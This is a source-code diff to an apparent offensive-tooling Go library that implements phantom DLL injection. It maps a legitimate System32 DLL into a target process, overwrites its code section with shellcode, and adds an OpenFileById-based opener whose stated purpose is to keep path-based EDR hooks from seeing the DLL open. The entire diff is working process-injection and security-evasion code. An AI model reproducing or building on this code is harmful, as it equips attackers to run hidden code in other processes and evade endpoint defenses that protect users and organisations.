@@ -4,10 +4,12 @@ package inject
 
 import (
 	"fmt"
+	"io"
 	"os"
 	"path/filepath"
 	"unsafe"
 
+	"github.com/oioio-space/maldev/evasion/stealthopen"
 	"github.com/oioio-space/maldev/win/api"
 	"golang.org/x/sys/windows"
 )
@@ -20,7 +22,19 @@ const (
 // PhantomDLLInject creates a section from a legitimate System32 DLL,
 // maps it into the target process, and overwrites the .text section
 // with shellcode. The memory scanner sees a file-backed image.
-func PhantomDLLInject(pid int, dllName string, shellcode []byte) error {
+//
+// opener is optional and mirrors the *wsyscall.Caller pattern: nil keeps
+// path-based opens (os.Open + windows.CreateFile), non-nil (typically
+// *stealthopen.Stealth built for System32\<dllName>) routes both the PE
+// bytes read and the section-creation handle through OpenFileById, so
+// path-based EDR hooks on System32 DLL opens never see the target path.
+//
+// Because NtCreateSection consumes a HANDLE, the opener is consulted
+// twice on the same path — once for the PE bytes (consumed by io.ReadAll)
+// and once to provide a live handle to NtCreateSection. This is
+// intentional: a Stealth opener pays one extra OpenFileById, not one
+// extra CreateFile.
+func PhantomDLLInject(pid int, dllName string, shellcode []byte, opener stealthopen.Opener) error {
 	if pid <= 0 {
 		return fmt.Errorf("valid target process required")
 	}
@@ -32,31 +46,28 @@ func PhantomDLLInject(pid int, dllName string, shellcode []byte) error {
 	sys32 := filepath.Join(os.Getenv("SYSTEMROOT"), "System32")
 	dllPath := filepath.Join(sys32, dllName)
 
-	// Read local copy for PE parsing.
-	localBytes, err := os.ReadFile(dllPath)
+	op := stealthopen.Use(opener)
+
+	// 2. Read local copy for PE parsing via opener (Standard = os.Open path,
+	//    Stealth = OpenFileById — no path-based hook ever sees the open).
+	peFile, err := op.Open(dllPath)
 	if err != nil {
-		return fmt.Errorf("failed to read source module")
+		return fmt.Errorf("failed to open source module for parse: %w", err)
+	}
+	localBytes, err := io.ReadAll(peFile)
+	peFile.Close()
+	if err != nil {
+		return fmt.Errorf("failed to read source module: %w", err)
 	}
 
-	// 2. Open DLL file for section creation.
-	pathUTF16, err := windows.UTF16PtrFromString(dllPath)
+	// 3. Second open for NtCreateSection. The HANDLE must be a kernel file
+	//    handle; *os.File.Fd() returns one for both OS primitives.
+	sectFile, err := op.Open(dllPath)
 	if err != nil {
-		return fmt.Errorf("path conversion failed: %w", err)
+		return fmt.Errorf("failed to open source module for section: %w", err)
 	}
-
-	hFile, err := windows.CreateFile(
-		pathUTF16,
-		windows.GENERIC_READ,
-		windows.FILE_SHARE_READ,
-		nil,
-		windows.OPEN_EXISTING,
-		0,
-		0,
-	)
-	if err != nil {
-		return fmt.Errorf("failed to open source module: %w", err)
-	}
-	defer windows.CloseHandle(hFile)
+	defer sectFile.Close()
+	hFile := windows.Handle(sectFile.Fd())
 
 	// 3. NtCreateSection(SEC_IMAGE).
 	var hSection windows.Handle
